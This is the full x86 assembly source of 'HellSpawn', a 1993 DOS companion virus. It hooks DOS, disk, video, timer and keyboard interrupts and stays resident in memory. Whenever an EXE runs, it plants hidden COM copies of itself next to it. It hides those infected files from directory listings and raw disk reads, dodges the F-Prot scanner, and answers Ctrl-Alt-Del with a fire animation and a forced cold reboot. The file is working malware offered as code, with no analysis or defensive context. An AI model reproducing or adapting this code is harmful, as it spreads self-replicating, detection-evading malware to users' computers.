;                HellSpawn Virus (c) 1993 by Stormbringer
;
;
;                                                   า  Stormbringer
;                                                 ออออออออออออออออฤฤฤฤฤ
;                                                   ะ
.model tiny
.radix 16
.code
        org 100
start:
        jmp     EntryPoint        

FindZero:        
        lodsb
        or      al,al
        jne     FindZero
        
        cmp     ds:[si-4],'XE'
        je      InfectOnOpen
        
        cmp     ds:[si-4],'OC'
        jne     Doneopen

OpenRequestedFile:
        mov     ax,3d00
        pushf
        call    dword ptr cs:[IP_21]
        xchg    bx,ax
        
        xor     cx,cx
        xor     dx,dx
        mov     ax,4202
        call    FakeInt21

        cmp     ax,endmain-start
        jne     CloseUp

        pop     di si ds es dx cx bx ax
        stc
        retf    002

CloseUp:
        jc      CloseUp
        mov     ah,3e
        call    FakeInt21
doneOPen:
        pop     di si ds es dx cx bx ax
        jmp     Go21

InfectOnOpen:
        pop     di si ds es dx cx bx ax
        jmp     Execute

NewOpen:
        push    ax bx cx dx es ds si di
        mov     dx,si
        jmp     FindZero
Open:
        push    ax bx cx dx es ds si di
        mov     si,dx
        jmp     FindZero

Terminateprog:
        mov     byte ptr cs:[StealthOn],1
        jmp     Go21


Int21:
        cmp     ah,4c
        je      Terminateprog
        or      ah,ah
        je      Terminateprog
        cmp     byte ptr cs:[StealthOn],0
        je      AfterStealthChecks
        cmp     ah,11h
        je      FindFile
        cmp     ah,12h
        je      FindFile
        cmp     ah,4eh
        je      FindHandle
        cmp     ah,4fh
        je      FindHandle

AfterStealthChecks:       
        cmp     ax,6c00
        je      NewOpen
        cmp     ah,3dh
        je      Open
        cmp     ax,4b00h
        jne     Go21
        jmp     Execute

Go21:        
        jmp     dword ptr cs:[IP_21]

FindHandle:
        pushf
        call    dword ptr cs:[IP_21]
        jc      ErrorHandleCall

        push    ax bx cx dx es ds si di
GetDTA:        
        mov     ah,2f
        call    FakeInt21

        cmp     word ptr es:[bx+1a],endmain-start       ;Check size
        jne     EndHandle

        mov     ah,byte ptr es:[bx+15]
        and     ah,2
        jz      Endhandle
        
        pop     di si ds es dx cx bx ax
        
        mov     ah,4f
        jmp     FindHandle

EndHandle:
        pop     di si ds es dx cx bx ax
        clc
DoneHandleStealth:
        retf    02

ErrorHandleCall:
        mov     ah,12
        retf    02

FindFile:
        call    FakeInt21
        cmp     al,0ff
        je      ErrorFF
        
Stealth:
        push    ax bx cx dx es ds si di
        
        mov     ah,2f
        call    FakeInt21

        cmp     byte ptr es:[bx],0ff
        jne     NotExtended
        add     bx,7
NotExtended:
        
        cmp     word ptr [bx+9],'OC'
        jne     DoneFF
        cmp     word ptr [bx+1dh],endmain-start
        jne     DoneFF

FindNextFile:                
        pop     di si ds es dx cx bx ax
        mov     ah,12
        jmp     FindFile

DoneFF:
        pop     di si ds es dx cx bx ax
        iret

ErrorFF:
        mov     al,0ff
        iret


Execute:
        push    ax bx cx dx es ds si di
        
        call    SetCritical        

        mov     si,dx
FindEndOfFilename:        
        lodsb
        or      al,al
        jne     FindEndOfFilename
        
CheckForCHKDSK:
        cmp     word ptr ds:[si-9],'DK'
        jne     AfterChkdsk

        mov     byte ptr cs:[StealthOn],0
        
AfterChkdsk:
        cmp     byte ptr ds:[si-0a],'-' ;If it's f-prot, exit
        je      EndExec

        cmp     word ptr ds:[si-4],'XE'
        jne     EndExec

        mov     si,dx
        mov     di,offset filename
        push    cs
        pop     es

CopyFilename:        
        lodsb
        stosb
        or      al,al
        jne     CopyFilename
        
        push    cs
        pop     ds

ChangeToCom:
        mov     word ptr es:[di-4],'OC'
        mov     byte ptr es:[di-2],'M'

CheckIfThere:
        mov     ax,3d00
        mov     dx,offset filename
        call    FakeInt21
        xchg    bx,ax
        jnc     CloseVirus

PlaceVirus:
        mov     ah,3c
        mov     cx,2
        mov     dx,offset Filename
        call    FakeInt21
        jc      EndEXEC

WriteVirus:
        inc     byte ptr [InfectionCounter]
        xchg    bx,ax       
        mov     ah,40
        mov     cx,endmain-start
        mov     dx,100
        call    FakeInt21

CloseVirus:
        mov     ah,3e
        call    FakeInt21

EndExec:
        call    ResetCritical

        pop     di si ds es dx cx bx ax
        jmp     Go21


Error13:
        stc
        retf    02

Int13:        
        cmp     ah,02        
        je      IsDiskRead
        jmp     GoInt13

IsDiskRead:
        pushf
        call    dword ptr cs:[IP_13]
        jc      Error13
AbsStealth:
        push    ax bx cx dx es ds si di
        push    cs
        pop     ds
        mov     di,bx
        mov     si,100
        mov     cx,100
        repz    cmpsb
        jcxz    IsVirus
        jmp     DoneAbsStealth
IsVirus:
        mov     di,bx
        mov     ax,9090
        mov     cx,0fe
        repnz   stosw
        mov     ax,20cdh
        stosw

DoneAbsStealth:
        pop     di si ds es dx cx bx ax
        clc
        retf    002

EntryPoint:
        push    ds
        mov     ax,ds        
        dec     ax
        mov     ds,ax
        mov     byte ptr ds:[0],'Z'     ;Mark as last in chain
        sub     word ptr ds:[03],80     ;Allocate Space From MCB (2k)
        sub     word ptr ds:[12],80     ;Allocate Space From PSP (2k)
        xor     ax,ax        
        mov     ds,ax
        dec     word ptr ds:[413]       ;Allocate Memory From Bios (2k)
        dec     word ptr ds:[413]      
        mov     ax,word ptr ds:[413]
        
CopyVirusToMem:        
        mov     cl,6
        shl     ax,cl
        sub     ax,10
        mov     es,ax
        pop     ds
        push    ds
        mov     si,100        
        mov     di,100
        mov     cx,end_prog-start
        repnz   movsb
        
;BX = IP of new int, CX = CS, DX = IntNum
;DI = address of interrupt storage
SetInterrupts:
        xor     ax,ax
        mov     ds,ax
        cli
SetInt21:        
        mov     ax,offset Int21
        mov     bx,es
        xchg    ax,word ptr ds:[21*4]
        xchg    bx,word ptr ds:[21*4+2]
        mov     word ptr es:[IP_21],ax
        mov     word ptr es:[CS_21],bx
SetInt13:
        mov     ax,offset Int13
        mov     bx,es
        xchg    ax,word ptr ds:[13*4]
        xchg    bx,word ptr ds:[13*4+2]
        mov     word ptr es:[IP_13],ax
        mov     word ptr es:[CS_13],bx
SetInt10:        
        mov     ax,offset Int10
        mov     bx,es
        xchg    ax,word ptr ds:[10*4]
        xchg    bx,word ptr ds:[10*4+2]
        mov     word ptr es:[IP_10],ax
        mov     word ptr es:[CS_10],bx
SetInt1c:        
        mov     ax,offset Int1c
        mov     bx,es
        xchg    ax,word ptr ds:[1c*4]
        xchg    bx,word ptr ds:[1c*4+2]
        mov     word ptr es:[IP_1c],ax
        mov     word ptr es:[CS_1c],bx

SetInt09:
        mov     ax,offset Int09
        mov     bx,es
        xchg    ax,word ptr ds:[09*4]
        xchg    bx,word ptr ds:[09*4+2]
        mov     word ptr es:[IP_09],ax
        mov     word ptr es:[CS_09],bx
        sti

        push    cs
        pop     ds

        mov     byte ptr cs:[StealthOn],1

RunOriginalProgram:
        mov     ax,ds:[2c]
        mov     ds,ax
        xor     si,si

FindPath:        
        lodsw
        or      ax,ax
        je      FoundPath
        dec     si
        jmp     FindPath

FoundPath:        
        lodsw

ChangeFilenameToEXE:        
        push    ds
        pop     es
        mov     di,si
        xor     al,al
        mov     cx,0ff
        repnz   scasb
        mov     word ptr es:[di-4],'XE'
        mov     byte ptr es:[di-2],'E'
        
        push    cs
        pop     es
        mov     ah,4a
        mov     bx,(end_prog-start+10f)/10
        int     21

        mov     cx,di
        sub     cx,si
        dec     cx
        mov     di,offset Filename
        mov     al,cl
        stosb
        repnz   movsb
        mov     byte ptr es:[di],0dh
        mov     si,offset Filename
        push    cs
        pop     ds

        int     2e                      ;Execute Command        
        
        mov     ax,4c00
        int     21

FakeInt21:
        pushf
        call    dword ptr cs:[IP_21]
        ret


SetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,offset CriticalHandler
        mov     bx,cs
        cli
        xchg    ds:[24*4],ax
        xchg    ds:[24*4+2],bx
        mov     word ptr cs:[CS_24],bx
        mov     word ptr cs:[IP_24],ax
        sti
        pop     ds bx ax
        ret

ResetCritical:
        push    ax bx ds
        xor     ax,ax
        mov     ds,ax
        mov     ax,word ptr cs:[IP_24]
        mov     bx,word ptr cs:[CS_24]
        cli
        mov     word ptr ds:[24*4],ax
        mov     word ptr ds:[24*4+2],bx
        sti
        pop     ds bx ax
        ret



CriticalHandler:
        mov     al,3
        iret

Credits db      'HellSpawn v0.91a (c) 1993 by Stormbringer'
EndCred:

Int10:
        cmp     ah,0
        jne     GoInt10
        mov     byte ptr cs:[FireActive],0
        cmp     al,13
        jne     GoInt10
        mov     byte ptr cs:[FireActive],1
GoInt10:
        db      0ea
IP_10   dw      0
CS_10   dw      0


Int09:
        push    ax
        in      al,60h
        cmp     al,53h
        je      IsDel
NotCtrlAltDel:  
        pop     ax                                                 
GoInt09:              
        db      0ea
IP_09   dw      0
CS_09   dw      0

IsDel:
        mov     ah,2
        int     16
        and     al,1100b
        cmp     al,0c
        jne     NotCtrlAltDel
RebootActivation:
        mov     di,0b800
        mov     es,di
        push    cs
        pop     ds
        mov     si,offset Fire
        mov     ax,03
        int     10
        mov     di,550
        
        mov     cx,7
BtBigLoop:        
        push    cx

BtDrawFireLine:
        mov     cx,8
   FireLine:        
        lodsb
        mov     ah,'Û'
        xchg    ah,al
        stosw
        loop    FireLine

        pop     cx
        add     di,90
        loop    BtBigLoop

ColdBoot:
        db      0ea
        db      0,0,0ff,0ff


Int1c:
        cmp     byte ptr cs:[FireActive],1
        jne     JmpInt1c
        push    ax bx cx dx es ds si di
        call    DrawFire
        call    ReverseFlame
        pop     di si ds es dx cx bx ax 
JmpInt1c:
        db      0ea
IP_1c   dw      0
CS_1c   dw      0

DrawFire:
        push    cs
        pop     ds
        mov     si,offset Fire
        mov     di,0a000
        mov     es,di
        xor     di,di
        mov     cx,7
  FireLoop:
        push    cx
        mov     cx,8
        repnz   movsb

        add     di,312d
        pop     cx
        loop    FireLoop
        ret

ReverseFlame:
        push    cs cs
        pop     es ds
        mov     si,offset Fire
        mov     cx,7
FlipAll:
        push    cx
        mov     cx,4
        mov     di,si
        add     di,7
 FlipLine:
        mov     al,byte ptr [si]
        xchg    al,byte ptr [di]
        mov     byte ptr [si],al
        dec     di
        inc     si
        loop    FlipLine
        pop     cx
        loop    FlipAll
        ret
Fire:
        db      00,04,00,00,00,00,00,00
        db      00,04,0c,04,00,00,00,00
        db      00,00,04,0c,04,00,00,00
        db      00,00,04,0c,04,04,00,00
        db      00,00,04,0e,0c,04,00,00
        db      00,04,04,0c,0e,0c,04,00
        db      04,04,0c,0e,0f,0c,0c,04

FireActive      db      0

InfectionCounter    db  0

GoInt13:
        db      0ea
endmain:
IP_13   dw      ?
CS_13   dw      ?
IP_21   dw      ?
CS_21   dw      ?
CS_24   dw      ?
IP_24   dw      ?

StealthOn       db      ?
filename        db      50 dup(?)
end_prog:
end start
